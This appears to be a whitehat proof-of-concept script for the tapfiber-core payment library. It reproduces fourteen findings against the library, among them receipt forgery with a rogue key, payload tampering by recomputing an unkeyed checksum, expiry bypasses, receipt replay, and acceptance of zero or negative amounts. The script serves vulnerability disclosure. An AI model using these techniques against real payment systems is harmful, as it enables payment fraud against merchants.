// ckb-whitehat PoC — tapfiber-core v0.1.0
// Run: node tapfiber/poc/attack.mjs
// Every finding below is asserted against the unmodified target source.
// The script exits non-zero if any finding it claims to reproduce fails to
// reproduce.
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import * as tf from "../src/index.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, "..");
const CLI = path.join(ROOT, "bin", "tapfiber.js");

const line = (t) => console.log("\n=== " + t + " ===");

let failures = 0;
const verdicts = [];

// assert(cond, msg) -> records a hard failure if cond is false
function assert(cond, msg) {
  if (!cond) {
    failures++;
    console.log("  ASSERT FAILED: " + msg);
  }
  return !!cond;
}

// claim(id, fired, {status, note})
function claim(id, fired, note = "") {
  const status = fired ? "FIRED" : "UNPROVEN";
  if (!fired) failures++;
  verdicts.push(`FINDING ${id} ${status}`);
  console.log(`FINDING ${id} ${status}${note ? " — " + note : ""}`);
  return fired;
}

// ---------------------------------------------------------------------------
// F1 — post-expiry confirmation accepted when event.at is omitted (HIGH)
// ---------------------------------------------------------------------------
line("F1 — post-expiry confirmation accepted when event.at is stripped");
let o = tf.createOrder({ orderId: "o1", amountShannons: "100", expiresAt: 1000, paymentHash: "h" });
const evil = { type: "payment_confirmed", amountShannons: 100, asset: "CKB", network: "testnet", paymentHash: "h", at: 5000 };
let r = tf.applyEvent(o, evil);
console.log("with at=5000  ->", r.rejected ?? r.order.state);
assert(r.order.state === "AWAITING_PAYMENT", "F1 control: late confirmation must be rejected");
r = tf.applyEvent(o, { ...evil, at: undefined });
console.log("at stripped   ->", r.order.state, "=> receipt issuable");
const f1 = assert(r.order.state === "PAID", "F1: stripped `at` must still mark the order PAID");
claim("F1", f1, "expired order accepted because event.at is optional");

// ---------------------------------------------------------------------------
// F2 — expiresAt is not enforced by createOrder (MEDIUM)
// ---------------------------------------------------------------------------
line("F2 — missing expiresAt disables expiry entirely");
o = tf.createOrder({ orderId: "o2", amountShannons: "100", paymentHash: "h" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 100, asset: "CKB", network: "testnet", paymentHash: "h", at: Number.MAX_SAFE_INTEGER });
console.log("at =", r.order.paidAt, "(~year 285,000) ->", r.order.state);
const f2 = assert(r.order.state === "PAID" && o.expiresAt === undefined, "F2: order without expiresAt must be created and confirmed");
claim("F2", f2, "no expiry bound on orders built directly");

// ---------------------------------------------------------------------------
// F3 — unpinned paymentHash accepts any payment (HIGH, integration-dependent)
// ---------------------------------------------------------------------------
line("F3 — order without paymentHash accepts attacker-chosen hash");
o = tf.createOrder({ orderId: "o3", amountShannons: "100", expiresAt: 9e15 });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 100, asset: "CKB", network: "testnet", paymentHash: "attacker-chosen" });
console.log("state:", r.order.state, " paymentHash:", r.order.paymentHash);
const f3 = assert(r.order.state === "PAID" && r.order.paymentHash === "attacker-chosen", "F3: any paymentHash must be accepted");
claim("F3", f3, "payment binding skipped when paymentHash is absent");

// ---------------------------------------------------------------------------
// F4 — verifyReceipt defaults to accepting any issuer key (HIGH by-default)
// ---------------------------------------------------------------------------
line("F4 — rogue-key receipt verifies 'valid' by default");
const forge = tf.generateKeys();
o = tf.createOrder({ orderId: "o4", amountShannons: "5000", expiresAt: 9e15, paymentHash: "h4" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 5000, asset: "CKB", network: "testnet", paymentHash: "h4", at: 1 });
o = r.order;
const rcpt = tf.issueReceipt(o, forge); // signed with an attacker key
const v4 = tf.verifyReceipt(rcpt);
console.log("verify without expected key ->", JSON.stringify(v4));
const f4 = assert(v4.valid === true, "F4: rogue-key receipt must verify valid with no expected key");
claim("F4", f4, "issuer pinning is opt-in");

// ---------------------------------------------------------------------------
// F5 — payload integrity is an UNKEYED checksum: tampering is O(1)
// ---------------------------------------------------------------------------
line("F5 — payload checksum is unkeyed: tampering is O(1), not 2^32");
const good = tf.encodePayload({ orderId: "v", amountShannons: "100000000", asset: "CKB", network: "testnet", invoice: "inv", expiresAt: 9e9 });
const mGood = /^tapfiber:1:([A-Za-z0-9_-]+)\.([0-9a-f]{8})$/.exec(good);
console.log("payload:", good.slice(0, 40) + "...", "check:", mGood[2]);
// Attacker edits the body and recomputes the checksum — no key, no search.
const decodedBody = JSON.parse(Buffer.from(mGood[1], "base64url").toString("utf8"));
decodedBody.amountShannons = "999999999";
const tamperedB64 = Buffer.from(tf.canonical(decodedBody)).toString("base64url");
// check() hashes the base64url body string, exactly as encodePayload does.
const tamperedCheck = crypto.createHash("sha256").update(tamperedB64).digest("hex").slice(0, 8);
const tampered = `tapfiber:1:${tamperedB64}.${tamperedCheck}`;
console.log("tampered:", tampered.slice(0, 40) + "...", "check:", tamperedCheck, "(recomputed, O(1))");
const before = tf.decodePayload(good);
const after = tf.decodePayload(tampered, { now: 500 });
console.log("amountShannons:", before.amountShannons, "->", after.amountShannons);
const f5 = assert(
  after.amountShannons === "999999999" && before.amountShannons === "100000000" && tamperedCheck.length === 8,
  "F5: recomputed checksum must make a tampered payload decode"
);
claim("F5", f5, "unkeyed sha256 prefix -> active tampering is cheap, not 2^32");

// ---------------------------------------------------------------------------
// F6 — receipt body omits invoice and expiresAt (LOW–MEDIUM)
// ---------------------------------------------------------------------------
line("F6 — receipt body drops expiresAt and invoice (forgery by omission)");
o = tf.createOrder({ orderId: "o6", amountShannons: "10", expiresAt: 9e15, paymentHash: "h6", invoice: "real" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 10, asset: "CKB", network: "testnet", paymentHash: "h6", at: 1 });
o = r.order;
const real = tf.generateKeys();
const rcpt6 = tf.issueReceipt(o, real);
const signedFields = Object.keys(rcpt6.body).join(", ");
console.log("signed body fields:", signedFields,
  "| NOT signed: invoice, expiresAt -> the signature proves 'amount X paid', not 'order O paid by time T'");
const f6 = assert(
  !("invoice" in rcpt6.body) && !("expiresAt" in rcpt6.body) && "invoice" in o && "expiresAt" in o,
  "F6: receipt body must omit invoice/expiresAt present on the order"
);
claim("F6", f6, "signature is not order-bound");

// ---------------------------------------------------------------------------
// F7 — receipts have no nonce/TTL: infinite replay (MEDIUM)
// ---------------------------------------------------------------------------
line("F7 — receipt replay: same receipt proves 'paid' forever, for any number of claims");
o = tf.createOrder({ orderId: "o7", amountShannons: "10", expiresAt: 9e15, paymentHash: "h7" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 10, asset: "CKB", network: "testnet", paymentHash: "h7", at: 1 });
const k = tf.generateKeys();
const rc = tf.issueReceipt(r.order, k);
let replayOk = 0;
for (let i = 0; i < 3; i++) {
  const v = tf.verifyReceipt(rc, { expectedPublicKey: k.publicKey });
  console.log("replay", i + 1, "->", JSON.stringify(v));
  if (v.valid) replayOk++;
}
const f7 = assert(replayOk === 3, "F7: the same receipt must verify 3/3 times");
claim("F7", f7, "no nonce, no TTL, no redemption log");

// ---------------------------------------------------------------------------
// F8 — canonical() emits {"paidAt":undefined}: broken receipt round-trip
// ---------------------------------------------------------------------------
line("F8 — receipt with undefined paidAt verifies locally but breaks after JSON round-trip");
const paidNoAt = tf.applyEvent(
  tf.createOrder({ orderId: "o8", amountShannons: "1", expiresAt: 9e15, paymentHash: "h8" }),
  { type: "payment_confirmed", amountShannons: 1, asset: "CKB", network: "testnet", paymentHash: "h8" }
).order;
const k8 = tf.generateKeys();
const rc8 = tf.issueReceipt(paidNoAt, k8);
console.log("canonical(body):", tf.canonical(rc8.body));
console.log("verify (in-memory):", JSON.stringify(tf.verifyReceipt(rc8)));
const rc8json = JSON.parse(JSON.stringify(rc8));
console.log("verify (after JSON.stringify):", JSON.stringify(tf.verifyReceipt(rc8json)));
const f8 = assert(
  tf.verifyReceipt(rc8).valid === true && tf.verifyReceipt(rc8json).valid === false,
  "F8: in-memory verify must pass and post-JSON verify must fail (bad_signature)"
);
claim("F8", f8, "undefined in canonical body = broken round-trip");

// ---------------------------------------------------------------------------
// F9 — verifyReceipt skips issuer verification when expectedPublicKey is ""
// ---------------------------------------------------------------------------
line("F9 — expectedPublicKey: \"\" (empty key file) disables issuer verification");
const rogue = tf.generateKeys();
const paid9 = tf.applyEvent(
  tf.createOrder({ orderId: "o9", amountShannons: "1", expiresAt: 9e15, paymentHash: "h9" }),
  { type: "payment_confirmed", amountShannons: 1, asset: "CKB", network: "testnet", paymentHash: "h9", at: 1 }
).order;
const rc9 = tf.issueReceipt(paid9, rogue);
const v9 = tf.verifyReceipt(rc9, { expectedPublicKey: "" });
console.log("rogue receipt, expectedPublicKey:\"\" ->", JSON.stringify(v9));
// and through the CLI with an empty key file
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "tapfiber-poc-"));
fs.writeFileSync(path.join(tmp, "receipt.json"), JSON.stringify(rc9));
fs.writeFileSync(path.join(tmp, "empty.pem"), "");
const v9b = tf.verifyReceipt(rc9, { expectedPublicKey: fs.readFileSync(path.join(tmp, "empty.pem"), "utf8") });
console.log("rogue receipt, expectedPublicKey:\"\" (as CLI reads an empty key file) ->", JSON.stringify(v9b));
const f9 = assert(v9.valid === true && v9b.valid === true, "F9: an empty expected key must still accept a rogue issuer");
claim("F9", f9, "empty expectedPublicKey bypasses issuer pinning");

// ---------------------------------------------------------------------------
// F10 — applyEvent accepts non-numeric / non-finite event.at and event.now
// ---------------------------------------------------------------------------
line("F10 — applyEvent accepts non-numeric event.at / event.now");
const o10 = tf.createOrder({ orderId: "o10", amountShannons: "1", expiresAt: 1000, paymentHash: "h10" });
const badTimes = [];
for (const at of ["not-a-number", null, NaN, undefined]) {
  const rr = tf.applyEvent(o10, { type: "payment_confirmed", amountShannons: 1, asset: "CKB", network: "testnet", paymentHash: "h10", at });
  console.log("payment_confirmed at=" + String(at) + " ->", rr.order.state, JSON.stringify(rr.rejected || ""));
  if (rr.order.state === "PAID") badTimes.push(String(at));
}
const tickNaN = tf.applyEvent(o10, { type: "tick", now: NaN });
const tickStr = tf.applyEvent(o10, { type: "tick", now: "not-a-number" });
console.log("tick now=NaN ->", tickNaN.order.state, "| tick now=\"not-a-number\" ->", tickStr.order.state);
const f10 = assert(
  badTimes.length === 4 && tickNaN.order.state === "AWAITING_PAYMENT" && tickStr.order.state === "AWAITING_PAYMENT",
  "F10: non-numeric at must mark PAID, non-numeric now must not expire the order"
);
claim("F10", f10, "no type check on event.at / event.now");

// ---------------------------------------------------------------------------
// F11 — createOrder accepts invalid amounts; amountShannons 0 transitions to PAID
// ---------------------------------------------------------------------------
line("F11 — createOrder accepts invalid amountShannons (0, \"-100\", NaN, undefined, \"1.5\")");
const accepted = [];
for (const amount of [0, "-100", NaN, undefined, "1.5"]) {
  const oo = tf.createOrder({ orderId: "x", amountShannons: amount, expiresAt: 9e15, paymentHash: "h" });
  const rr = tf.applyEvent(oo, { type: "payment_confirmed", amountShannons: amount, asset: "CKB", network: "testnet", paymentHash: "h", at: 1 });
  console.log("amountShannons=" + String(amount) + " -> order.amountShannons=" + JSON.stringify(oo.amountShannons) + ", state=" + rr.order.state);
  if (rr.order.state === "PAID") accepted.push(String(amount));
}
const o11 = tf.createOrder({ orderId: undefined, amountShannons: "1", expiresAt: 9e15, paymentHash: "h" });
console.log("orderId undefined -> orderId=" + JSON.stringify(o11.orderId));
const f11 = assert(
  accepted.length === 5 && o11.orderId === undefined,
  "F11: all five invalid amounts must reach PAID"
);
claim("F11", f11, "zero / negative / NaN / undefined / fractional amounts all reach PAID");

// ---------------------------------------------------------------------------
// F12 — decodePayload accepts { now: NaN }; CLI decode never passes now
// ---------------------------------------------------------------------------
line("F12 — expiry bypass: { now: NaN } passes the check, CLI never supplies now");
const p12 = tf.encodePayload({ orderId: "v", amountShannons: "100", asset: "CKB", network: "testnet", invoice: "i", expiresAt: 1000 });
const dNaN = tf.decodePayload(p12, { now: NaN });
console.log("decodePayload(payload, { now: NaN }) ->", JSON.stringify(dNaN));
let threw = "";
try { tf.decodePayload(p12, { now: 99999 }); } catch (e) { threw = e.message; }
console.log("decodePayload(payload, { now: 99999 }) ->", threw || "(no throw)");
const cliOut = execFileSync(process.execPath, [CLI, "decode", p12], { encoding: "utf8" });
console.log("CLI `tapfiber decode` on the same expired payload ->", JSON.stringify(JSON.parse(cliOut)));
const f12 = assert(
  dNaN.expiresAt === 1000 && threw === "payload expired" && JSON.parse(cliOut).expiresAt === 1000,
  "F12: NaN now must bypass expiry and the CLI must decode an expired payload"
);
claim("F12", f12, "NaN now bypasses expiry; the CLI has no expiry check at all");

// ---------------------------------------------------------------------------
// F13 — verifyReceipt does not validate the body schema; issueReceipt does not
//       check that publicKey/privateKey correspond
// ---------------------------------------------------------------------------
line("F13 — receipt body is not schema-validated; issueReceipt does not check key correspondence");
const A = tf.generateKeys();
const B = tf.generateKeys();
const garbageBody = { garbage: 1 };
const garbageSig = crypto.sign(null, Buffer.from(tf.canonical(garbageBody)), A.privateKey).toString("base64");
const v13a = tf.verifyReceipt({ body: garbageBody, publicKey: A.publicKey, signature: garbageSig });
console.log("signed body {garbage:1} ->", JSON.stringify(v13a));
const minimalBody = { version: 1, orderId: "x" };
const minimalSig = crypto.sign(null, Buffer.from(tf.canonical(minimalBody)), A.privateKey).toString("base64");
const v13b = tf.verifyReceipt({ body: minimalBody, publicKey: A.publicKey, signature: minimalSig });
console.log("signed body {version:1,orderId:'x'} (no amount/asset/network) ->", JSON.stringify(v13b));
const paid13 = tf.applyEvent(
  tf.createOrder({ orderId: "o13", amountShannons: "1", expiresAt: 9e15, paymentHash: "h13" }),
  { type: "payment_confirmed", amountShannons: 1, asset: "CKB", network: "testnet", paymentHash: "h13", at: 1 }
).order;
const mismatched = tf.issueReceipt(paid13, { privateKey: A.privateKey, publicKey: B.publicKey });
const v13c = tf.verifyReceipt(mismatched);
console.log("issueReceipt(privateKey=A, publicKey=B) ->", JSON.stringify(v13c));
const f13 = assert(
  v13a.valid === true && v13b.valid === true && v13c.valid === false && v13c.reason === "bad_signature",
  "F13: arbitrary bodies must verify and a mismatched keypair must yield an unverifiable receipt"
);
claim("F13", f13, "no body schema check, no keypair correspondence check");

// ---------------------------------------------------------------------------
// F14 — validate() accepts expiresAt <= 0, array amounts, and falsy required fields
// ---------------------------------------------------------------------------
line("F14 — payload validate() accepts expiresAt<=0, array amounts, falsy required fields");
const validateCases = [
  ["expiresAt: 0", { orderId: "v", amountShannons: "100", asset: "CKB", network: "testnet", invoice: "i", expiresAt: 0 }],
  ["expiresAt: -1", { orderId: "v", amountShannons: "100", asset: "CKB", network: "testnet", invoice: "i", expiresAt: -1 }],
  ["amountShannons: ['100']", { orderId: "v", amountShannons: ["100"], asset: "CKB", network: "testnet", invoice: "i", expiresAt: 9e9 }],
  ["orderId: null", { orderId: null, amountShannons: "100", asset: "CKB", network: "testnet", invoice: "i", expiresAt: 9e9 }],
  ["invoice: false", { orderId: "v", amountShannons: "100", asset: "CKB", network: "testnet", invoice: false, expiresAt: 9e9 }],
  ["asset: 0", { orderId: "v", amountShannons: "100", asset: 0, network: "testnet", invoice: "i", expiresAt: 9e9 }],
];
const validateAccepted = [];
for (const [label, p] of validateCases) {
  let res = "";
  try {
    const enc = tf.encodePayload(p);
    res = "ACCEPTED";
    validateAccepted.push(label);
  } catch (e) { res = "rejected: " + e.message; }
  console.log(label + " -> " + res);
}
const f14 = assert(validateAccepted.length === validateCases.length, "F14: all six malformed payloads must be accepted");
claim("F14", f14, "validate() only checks undefined/empty-string, not type or range");

fs.rmSync(tmp, { recursive: true, force: true });

console.log("\n--- verdict lines ---");
for (const v of verdicts) console.log(v);
console.log(failures === 0
  ? `\nAll ${verdicts.length} findings reproduced (${verdicts.length} FIRED, 0 UNPROVEN). See FINDINGS.md for impact + patch per finding.`
  : `\n${failures} assertion(s) failed — at least one finding did NOT reproduce.`);
if (failures !== 0) process.exitCode = 1;
